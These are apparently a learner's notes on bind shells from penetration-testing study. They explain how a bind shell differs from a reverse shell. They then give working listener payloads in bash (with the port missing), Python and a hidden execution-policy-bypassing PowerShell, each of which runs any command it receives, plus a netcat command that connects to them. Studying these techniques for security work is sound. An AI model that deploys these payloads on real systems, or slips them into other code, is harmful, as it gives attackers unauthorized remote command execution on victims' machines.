Another type of shell us a Bind Shell. 
Unlike Reverse Shell that connects to us, we will have to connect to it on the targets listening port 

Once we execute Bind Shell COmmand, it will start listening on a port on the remote host and bind that host's shell ,i.e., Bash or POwershell, to that port. We have to connect to that port with netcat, and we will control through a shell on a system. 

Consult again Payload All The Things to find a proper command to start the bind shell 

Â¬Start listening connection on port 1234 on the remote host with IP 0.0.0.0 so that we can connect to it from anywhere. 

The following commands we can use to start a bind shell are listed here

BASH 
 
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp  >/tmp/f

PYTHON
$ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

POWERSHELL 
$powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

NETCAT CONNECTION 
Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it
We can use netcat to connect to that port and get a connection to the shell: 

$nc 10.10.10.1 1234 

As we can see , we are directly dropped into a bash session and can interact with the target system directy. Unlike a Reverse Shell, if we drop our connection for any reason, we can connect back to it and get aother connection immediately. 
However, if the bind shell command is stopped for any reason, or if the remote host is reboothed, we wuld still lose our access to the remote host and will have to exploit it again to gain access.

